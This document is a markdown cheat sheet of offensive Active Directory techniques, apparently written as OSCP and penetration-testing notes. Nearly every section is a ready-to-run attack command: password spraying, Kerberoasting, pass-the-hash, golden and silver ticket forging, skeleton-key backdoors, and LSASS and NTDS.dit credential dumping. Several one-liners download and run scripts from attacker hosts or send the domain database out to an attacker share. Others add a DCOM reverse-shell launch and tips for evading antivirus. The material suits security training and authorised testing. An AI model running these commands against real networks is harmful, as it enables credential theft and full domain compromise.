# AD Cheat Sheet

Very nice cheatsheet which goes beyond OSCP can be found here too: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

Use Exogol, it contains all the up to date tools mentioned in this papers: https://github.com/ThePorgs/Exegol

## Essentials

note: use pypykatz for offline emulation of mimikatz commands or for invoking mimikatz like commands via python on compromised machine. 

https://github.com/skelsec/pypykatz

Avoid using mimikatz without proper obfuscation as it can be detected by most AVs and EDRs.

```powershell

#PowerView: Retrieves current AD domain details (e.g., name, DCs) for initial recon.

Get-NetDomain

CrackMapExec: cme smb 192.168.1.0/24
Enumerates SMB hosts in a subnet to identify live systems for targeting.



Mimikatz: mimikatz.exe "sekurlsa::logonpasswords" exit
Dumps NTLM hashes and passwords from memory for Pass-the-Hash or Golden Ticket.



SharpHound: .\SharpHound.exe -c All
Collects AD data for BloodHound to map attack paths to Domain Admin.



Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt
Requests Kerberos service tickets for SPN accounts to crack weak passwords.



Impacket (secretsdump.py): secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>
Performs DCSync to extract krbtgt hash for Golden Ticket creation.



CrackMapExec: cme smb <TARGET_IP> -u <USER> -H <HASH>
Uses NTLM hash for Pass-the-Hash to move laterally to target systems.



Responder: python3 Responder.py -I <INTERFACE>
Captures NTLM hashes via LLMNR/NBT-NS poisoning for NTLM relay attacks.



Impacket (ntlmrelayx.py): ntlmrelayx.py -tf targets.txt
Relays captured NTLM hashes to target systems for privilege escalation.



Impacket (ticketer.py): ticketer.py -nthash <KRBTGT_HASH> -domain <DOMAIN>
Creates a Golden Ticket for persistent domain-wide access using the krbtgt hash.


```


## Theory

### AD Structure

* Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
* AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
* **NTDS.dit** is stored by default in %SystemRoot%\NTDS  

```powershell
# Or find ntds.dit using Powershell
Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
```

* DC handles authentication and authorization services
* DC replicate updates from other domain controllers in the forest
* DC Allows admin access to manage domain resources

### Forest

* Forest: collection of one or more trees
* Tree: collection of several domains with hierarchical order
* Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
* Trusts: Allows users to access resources in other domains
* Objects: users, groups, printers, computers, shares
* Domain Services: DNS Server, LLMNR, IPv6, MSSQL etc.
* Domain Schema: Rules for object creation

Example structre would have top domain like **main.com** and under it may be further domains **sub.main.com** and **external.main.com**. Thos three domain represnet a tree. OUs in main can access sub and external but not in reverse.

### Users

Users are core of AD and DC's task is to manage access of those users to services.

* Domain Admins (DA): have ultimate control over the domain. They can access to the domain controller. If DA is compromised then NTDS.dit can be dumped using dsync attack.
* Service Accounts (can be also have Domain Admin rights): required by Windows for services such as SQL to pair a service with a service account. Some of them are associated with user accounts and have human-made passwords what makes them vulnerable to Kerberoasting attacks. 
* Local Administrators: local machine administrators. Compromis of local admin can lead to ticket and credentials grabbing from local machine to impersonate other users and services in AD.
* Domain Users: normal users. They can log into machines where they are authorized to. Users may be part of interesting groups that allows lateral movement once the user account is compromised.

### Groups

* Security Groups: permissions users and services. Some groups have rights to change DACLs.
* Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

### Time Sync

* manual way

```bash


nmap -sT $DC_IP -p445 --script smb2-time -vv

Host script results:
| smb2-time: 
|   date: 2024-10-11T22:58:45
|_  start_date: N/A


faketime '2022-10-11 22:58:45' bash

```


* to be able to use Kerberos Authentication it is necessary to sync clock with AD domain controller

```bash
#check time

tzutil /g

time

sudo apt-get install ntp

vi /etc/ntp.conf

server 0.dc01.corp.local


/etc/init.d/ntpd restart

# or

/usr/sbin/ntpdate pool.ntp.org


```

### Kerberos authentication setup

It is possible to setup local Kerberos authentication for linux if credentials and access to target networks are given.

```bash
kinit logtin@corp.com -V
sudo cat /etc/krb5.conf
klist
```

Also possible to associate workstation using `realm`

https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/connecting-rhel-systems-directly-to-ad-using-sssd_integrating-rhel-systems-directly-with-active-directory

## Active Directory Enumeration

### net.exe

'net.exe' system utility is widely available and can be used once foothold on windows host within domain is obtained.

* `net user`
* `net user /domain` returns a list of users in domain
* `net user some_admin /domain` info about some_admin domain account
* `net group /domain`
* `net accounts` lookup AD password policy

Always make sure that you check if some account is a domain account or local. If account is a domain accoutn use it for further domain enumeration!

#### Domain Controller Discovery
For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located


* **Troubleshooting**: `nltest /dsgetdc:domain.local`
* **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
* **Using nltest**: `nltest /dclist:domain.local`


### powershell methods

* execute commands stand alone or make a script

```powershell

# Import-Module .\function.ps1
# Set-ExecutionPolicy -ExecutionPolicy Bypass 
# LDAPSearch -LDAPQuery "(samAccountType=805306368)"

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

   #[System.DirectoryServices.ActiveDirectory.Domain] namespace  used to get Domain Class and its method GetCurrentDomain()

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

   #DirectorySearcher class performs queries against AD using LDAP

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}

#To enumerate every group available in the domain and also display the user members

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }

#$sales = LDAPSearch -LDAPQuery "(&(objectClass=user)(cn=jeff))"


$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"


$sales.properties.member
```


## AD DNS

```bash

#poke Active Directory servers

dig -t _gc._tcp.lab.domain.com
dig -t _ldap._tcp.lab.domain.com
dig -t _kerberos._tcp.lab.domain.com
dig -t _kpasswd._tcp.lab.domain.com
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"

```

### Domain Hosts Discovery

* NetBios scan: `nbtscan 192.168.100.0/24`
* LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
* NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
* Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)

### Users discovery

`ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`

### Domain dump with ldap

```
 ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt

ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```


* Helpful **Tools**:

* crackmapexec
* `enum4linux -a target_ip > enum.log`

* AD recon: https://github.com/sense-of-security/ADRecon
* Bloodhound: https://github.com/BloodHoundAD/BloodHound
* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast


### Crackmapexec

find machines in range where current user is admin

`cme smb 192.168.239.0/24 -u pete -p "Nexus123\!" --continue-on-success`

### Kerbrute

find users of domain via TGT requests

`./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`

### PowerView

Reference: https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview


* Poverview has a lot of built-in AD functionalities
* So once a domain machine is compromised, upload and run powerview on it

```powershell

#  agentless command execution

IEX(New-Object Net.WebClient).downloadString('http://192.168.1.xxx/PowerView.ps1'); Get-NetComputer | select cn;


```

* Useful poverview commands

``` powershell
#get all computers in AD

Get-NetComputer | select cn

# users

Get-NetUser | select cn

# groups 

Get-NetGroup
```

* It is important to find high value target users and where they are currently logged in to later compromise those machines and retrieve tickets or hashes.

``` powershell
# currently logged in users

Get-NetLoggedon -ComputerName client251

# active sessions to DC

Get-NetSession -ComputerName dc01

```

* enumerating shares

`Get-NetShare`

* Identifying privileges

```powershell

# what kind of permissions does a user within domain have
Get-NetEffectivePermissions -Identity <username> -Domain <domain_name> -ObjectName <object_name>
# omit object name to see permissions for all objects

#find computers where local user has admin access

Find-LocalAdminAccess

# get exact permission type for some identity

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

```

* change domain user password if you got permissions for that

```powershell
$UserPassword = ConvertTo-SecureString 'Password1' -AsPlainText -Force

#user powerview for that 
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx/PowerView.ps1'); Set-DomainUserPassword -Identity robert -AccountPassword $UserPassword
```

### Bloodhound

Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

Get Sharphound on target host to collect data for Bloodhound

`IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1') ; Invoke-BloodHound`

Remote invokation:

`./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`

It is important to state the name server!

#### Launching Bloodhound and AD Visualization

1. launch neo4j: `sudo neo4j console`
2. launch GUI: `bloodhound`
3. click on Upload Data in the upper right corner
4. Right-Click on free are on the screen and select "Reload Query"

#### Filtering

* set owned principals 
* click on funnel to filter and remove for instance `CanRDP`
* set and find high value targets


```powershell
#here lookin for unconstrained deleg

MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH "516" WITH COLLECT(dc) as domainControllers MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true}) WHERE NOT c in domainControllers SET c.highvalue = true RETURN c

```

* find shortest path

```powershell

MATCH p=shortestPath((c {owned: true})-[*1..3]->(s)) WHERE NOT c = s RETURN p

# to high value and DA
MATCH p=shortestPath((u {highvalue: false})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@HACKERS.LAB'})) WHERE NOT (u)-[:MemberOf*1..]->(:Group {highvalue: true}) RETURN p
```

## Exploitation

Try attacking AD in this order:

* Password Spray
* Kerberos brute-force
* ASREPRoast
* Kerberoasting
* Pass the hash
* Pass the Ticket
* Overpass the Hash
* Pass the ticket
* Silver ticket
* Distributed Component Object Model
* Golden Ticket
* Windows Management Instr: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
* Powershell Remoting


### Password Spray

* obtain user names with any technique listed above or dumping from somewhere

#### Remote

* SMB

`cme smb bamdc1.skorp.com -u users_enum.txt -p Password1 --continue-on-success | grep '+'`

* TGT

`kerbrute passwordspray -d corp.com --dc 192.168.239.70 users_spray.txt "Nexus123\!"`

#### Local

* download script and invoke spray

``` powershell 

IEX(New-Object Net.WebClient).downloadString('http://192.168.45.239/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password "Nexus123!" -UserList users.txt -Domain corp.com

```

## Credentials Dumping

### mimikatz

Most of the AD attacks shall require hash or ticket that can be only extracted with SYSTEM rights from the target host.

```powershell

#engage the SeDebugPrivlege
privilege::debug

#dump the credentials of all logged-on users using the Sekurlsa
sekurlsa::logonpasswords

# get the hash here
```

Or just a oneliner

`.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > pass.txt`

Or change the name to `p.exe` and

```cmd
c:\ProgramData\p.exe  ""privilege::debug"" ""sekurlsa::logonpasswords""
```

Or powershell version

```powershell

powershell  -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString('https://ip.attqacker/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
```

more options to hide mimikatz

`https://www.crowdstrike.com/blog/credential-theft-mimikatz-techniques/`

### Pypykatz -> Preferred

This is the preferred method for extracting credentials from the compromised windows host, as it happens offline, apart from dumping the lsass locally.

``` powershell
procdump.exe -ma lsass.exe C:\Temp\lsass.dmp


# Find LSASS PID 
tasklist | findstr lsass.exe
#dump lsass
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Temp\lsass.dmp full

#dump the creds
pypykatz lsa minidump lsass.dmp
```

## Password misuse

* if clear text password is obtained start new powershell session

```powershell

# Set the username and password
$username = "Username"
$password = ConvertTo-SecureString -String "Password" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, $password

# Create a new PowerShell session with the specified credentials
$session = New-PSSession -ComputerName "RemoteComputerName" -Credential $credential

# Enter the session and execute commands
Enter-PSSession -Session $session

# Example: Run a command within the session
Get-Process

# Exit the session
Exit-PSSession


```

### Request Service Ticket

If name of particular service is know, ticket can be requested for later attempting to crack its hash.

```powershell 

iex(New-Object Net.WebClient).DownloadString('http://192.168.119.181/Request_ST.ps1')

#list all user tickets

klist

```

* after this the service can be accessed

### Pass the Hash

* if hash is obtained from the memmory

```bash

# remote from kali machine

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

```powershell
# locally on windows host

sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe

```

* bruteforce with crackmapexec

```bash

crackmapexec smb ip -u users.txt -H 2126EE7712D37E265FD63F2C84D2B13D --local-auth

```

* bruteforce with hydra

```powershell

## PSH SMB
hydra smb://ip  -l username -p D5731CFC6C2A069C21FD0D49CAEBC9EA:2126EE7712D37E265FD63F2C84D2B13D::: -m "local hash"

## BRUTEFORCING SMB ON OTHER DOMAIN IN AD WITH PASSWORDLIST
hydra smb://microsoft.com  -l username -P passwords.txt -m "other_domain:SECONDDOMAIN"

```


### Overpass the Hash

This attack uses NTLM hash to obtain a TGT to gain further access if user was logged on on the compromised machine where you fot SYSTEM rights.

Also possible to generate NTLM hash in linux if password is given

```bash
pw=Password123

printf '%s' "$pw" | iconv -t utf16le | openssl md4

#thats NT hash
MD4(stdin)= 58a478135a93ac3bf058a5ea0e8fdb71

```

#### Option A: mimikatz

```powershell

privilege::debug

sekurlsa::logonpasswords

# copy NTLM for the user in scope

# perform pass the hash

sekurlsa::pth /user:user101 /domain:scorp.com /ntlm:1234ef79d8372408bf6e93364cc93075 /run:powershell

# access some service to grab TGT
net use \\DC01

# run psexec

.\ps.exe -accepteula \\dc01 cmd

# enjoy!

```

#### Option B: rubeus


```bash


#use mimikatz to obtain powershell session as admin if NTLM hash is available

Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] 


```


#### Option c: impacket

```bash

impacket-getTGT scorp.com/Administrator -hashes :9bff06fe611486579fb74037890fda96 -dc-ip 192.168.219.154

# perform some magic to inject ticket to ccache

export KRB5CCNAME=/path/to/your/credential/cache

# start impackets psexec an use ccache

impacket-psexec -no-pass -k -dc-ip 198.xxx.xxx.xxx scorp.com/admin@PC1 cmd

```


### Brute Force ASREP roast

#### ASREP remotely

```bash
impacket-GetNPUsers corp.local/user101:Password101 -no-pass -format hashcat -outputfile spooky.hash -dc-ip "10.10.43.76" -request
```


#### ASREP locally

`.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`

* crack hashes on Windows

after copy-pasting sanitize the file removein spaces and newlines

`cat hashes.asreproast | tr -d '\n' | tr -d ' '`

add `$23$` if needed and save file using notepad++ as ANSI encoded file

`hashcat -m 18200 -a 0 spooky.hash /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/best64.rule --force`

Rule file: `./rules/best64.rule`

### Dsync Attack

* Find accounts with permissions for DSync using **powerview**

```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

```

* secrets dump

`impacket-secretsdump xxx/usename:"ComplexPassword!"@10.10.10.xxx -just-dc-user Administrator`

* mimikatz

```powershell

# start session as Domain admin on any machine

lsadump::dsync /user:corp\Administrator 

```


* exploit using psexec

`.\PSExec.exe \\dc1.domain.com cmd`

* or just crack NTLM hash

`hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule --force`

### Kerberoasting

* Look for kerberoastable accounts:

`ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`

if credentials available then login using parameters
`ldapsearch -H ldap://10.11.1.xxx -D 'Domain.com/User' -w 'PAsswrord'`

or use rubeus `Rubeus.exe kerberoast /stats`

* Perform roasting

```bash

impacket-GetUserSPNs -request -dc-ip 192.168.xx.xx corp.com/user101

#OR locally with  Rubeus

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap

# selective for a specific SPN using ticket

Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> /nowrap
```

* And finally, crack the hash

`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Pass the Ticket

* dump TGT from LSASS
* use TGT toact as domain admin by injecting it into current login sessions ID
* access services that can be accessed by the admin owner of the ticket


1. Perform triage with Rubeus: `.\Rubeus.exe triage`
2. see which tickets provide access to tgt
3. Dump these tickets with Rubeus: `.\Rubeus.exe dump /user:user_that_accessed_tgt`
4. Copy base64TGT and convert it to a single line string:
```
Windows:
$base64RubeusTGT=$(Get-Content ./tgt.txt) # where tgt.txt contains unstructured base64
$base64RubeusTGT.Replace(" ","").replace("`n","")

Linux:
tr -d '\n' < tgt.txt | tr -d ' '

Make kirbi ticket from BASE64 blob
[IO.File]::WriteAllBytes("c:\ok\xxx.kirbi", [Convert]::FromBase64String($xxx))

```
5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`



#### Using mimikatz

```cmd
sekurlsa::tickets /export
kerberos::ptt [ticket name]
```

### Silver Ticket
Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets

#### Mimikatz Workflow

Guide to mimikatz: https://adsecurity.org/?page_id=1821

1. Obtain SID and SPN

```powershell

whoami /user

# all numbebers before the relative identifier (last 4 numbers) are SID we need

or use powerview

Import-Module <Path to PowerView.ps1>
Get-DomainSID

# obtain SPNs

Get-DomainUser -SPN | select sereviceprincipalname

```

2. Obtain SPN hash

* get hash for this service (no user hash needed)
* For this refer to credentials dump using mimikatz

3. Make Silver ticket

```powershell

mimikatz # kerberos::purge

mimikatz # kerberos::list

# generate RC4 hashed password now with Rubeus, for instance

mimikatz # kerberos::golden /user:user101 /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

# actually any user can be used what makes impersonation possible

#finally launch cmd on behalf of impersonated service
mimikatz # exit

# confirm ticket 

klist

# outputs ticket details

# Access the service 

```

4. Export tickets to kali

```bash

mimikatz # kerberos::list /export

```

#### Rubeus Workflow

Typical workflow:
1. Compromise some Computer within AD
2. Dump Hash: mimikatz, lsassy (more silent)
3. Forge NTLM hash RC4 (or better) for later use
compromised password -> https://www.browserling.com/tools/ntlm-hash
4. Forge ticket using rubeus:
`Rubeus.exe silver /service:SQL/dc1.local.com /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)

Reference: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/

### Golden Ticket

#### remote golden ticket

`impacket-ticketer -domain scorp.com  -domain-sid S-1-5-21-3896762001-1128619745-3071798364 -nthash e1c6184fa33e8450fbd726c147ae0e19 -duration 7 -dc-ip 192.168.219.154 berta_moses`

#### Mimikatz Golden Ticket

1. Dump SID and hash and inject it into memmory

`lsadump::lsa /inject /name:krbtgt`

Or if localy loggeon to DC

`lsadump::lsa /patch`

2. Create golden Ticket

```powershell

kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884111 /krbtgt:e460605a9dbd55097c6cf77af2f89a03 /ptt

```

## Sekeleton key

It backdoors AD with a key implanted in DC memmory: mimikatz

`misc::skeleton`

for example access share using skeleton key

`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`

Access anything without knowing the user

`dir \\Desktop-1\c$ /user:Machine1 mimikatz`


## Hash cracking


* MsCacheV2

`hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85fxxx' /usr/share/wordlists/rockyou.txt --force --potfile-disable`

* NTLM

`hashcat -m 1000 admin.hashfile  /usr/share/wordlists/rockyou.txt`

* NTLMv2

`hashcat -m 5600 hash.txt passwords.txt`

## Distributed Component Object Model

The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized to do so.

```powershell

#from elevated shell

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.xx.xx"))

# pass the command

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

# or pass base64 encoded reverse shell

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e  base_64_code","7")

```

## Dumping Credentials

### lsassy

This is preferred and most silent way of dumping AD contents.

use `lsassy`

For that you are going to need credentials: local, ntlm, or ticket

### ntds.dit exfiltration using NTDSUTIL

dit-file with AD credentials can be dumped in a variety of ways once System privilege is obtained on domain controller

Make a fake AD installation file
`NTDSUTIL "Activate Instance NTDS" "IFM" "Create Full C:\Files" "q" "q"`

Copy it to attacking machine
`Copy-Item -Path  C:\Files -Destination  '\\192.168.219.129\dumb' -Recurse`

Contents should be like
```
└─$ tree Files    
Files
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SECURITY
    └── SYSTEM
```

Then secretsdump.py can be used to decrypt and dump hashes from ntds.dit.

For doing that authentification information of DC needed.

Best best is to use lsassy remotely or mimikatz/rubeus to get hashes locally.

`lsassy -u LocalBob -p Password1 192.168.219.133`

then you get something like

```
[+] 192.168.219.133 SKORP\BAMDC1$        [NT] 305ea2dea5d1f1e494645eb39784513a | [SHA1] d2837f19c7af41d9899d942b6d4c33663680a805
[+] 192.168.219.133 SKORP\Administrator  [NT] 64f12cddaa88057e06a81b54e73b949b | [SHA1] cba4e545b7ec918129725154b29f055e4cd5aea8
```
Grab the NT part from Administrator and construct secrets dump request

```
impacket-secretsdump -system Files/registry/SYSTEM -security Files/registry/SECURITY -ntds Files/Active\ Directory/ntds.dit -hashes :64f12cddaa88057e06a81b54e73b949b LOCAL -outputfile dit-extract
```

After that file dit-extract.ntds is going to appear in your directory

It can be then cracked using hashcat like so

`hashcat -a 0 -m 1000 -w 3  dit-extract.ntds  /usr/share/wordlists/rockyou.txt.gz --force --potfile-disable`

The cracked password is diplayed next to cracked hash that corresponds to some user like below.

Dictionary cache hit:
Filename..: /usr/share/wordlists/rockyou.txt.gz
Passwords.: 14344385
Bytes.....: 53357329
Keyspace..: 14344385

64f12cddaa88057e06a81b54e73b949b:Password1                

## Delegation Vulnerabilities

### Unconstrained delegation

A  mechanism where a user sends its credentials to a service and then the service accesses resources on the user’s behalf.

* find computers with trust for delegation
`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`

* monitor incoming tickets
`Rubeus.exe monitor /interval:1`

* force DC to connect to it via MS-RPRN RPC interface: kudos https://github.com/leechristensen/SpoolSample
`.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB`

Or one of the other options

```text
Responder
ARP Poisoning
Rogue DHCPv6
```

### Constrained delegation

Constrained delegation, if delegation must be used, is a much safer alternative as it restricts delegation to specific services. 

## Cracking Shdow copies 

```powershell

# 1. create a shadow copy of volume C:

vshadow.exe -nw -p  C:

# 2. copy shadow copies device name

Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# 3. copy ntds.dit from the Shadow to local disk 

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# 4. get system from current 

reg.exe save hklm\system c:\system.bak

# 5. use impackets secrets dump

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

```


## Relay Attacks

THIS PART IS NOT NEEDED FOR OSCP BUT IS VERY NEEDED FOR YOUR ACTUAL WORK!

## NTLM relay to SMB

NTLMv2 can be captured by Responder using various poisoning techniques. BUT IT CANNOT BE FORWARDED LIKE NORMAL NTLM.

NSo to exploit it you need to setup a relay and perform all actions through it:

1. crackmapexec genrelay: list hosts without SMB signing

`cme smb <197.1.1.0/24> --gen-relay-list './hosts/targets_smb_no_sign.txt'`

2. configure proxychains

```bash
sudo nano /etc/proxychains4.conf

#socks4 127.0.0.1 1080
```

3. Run ntlmrelayx with the targets from file from above. You may wish to also run it with socks and smb2support flags

```bash
ntlmrelayx.py -socks -smb2support -tf targets_smb_no_sign.txt
```

4. Run responder and disable SMB and HTTP

```bash

vim /etc/responder/Responder.conf

#SMB = Off
#HTTP = Off
```

If attack is successful then socks service is going to contain some sessions

5. Attack by sending all malicious requests like psexec et al through the proxy

`proxychains -q smbclient.py 'DOMAIN/USER_NAME@TARGET'`

or smbexec if ADMIN is given

`proxychains -q smbexec.py 'DOMAIN/USER_NAME@TARGET'`


## Additional Reading
* Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
* Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
* Relay Attacks: https://w4h33d.gitbook.io/hack-notes/active-directory-ad/active-directory-attacks/ipv6-attacks/ipv6-attack-in-action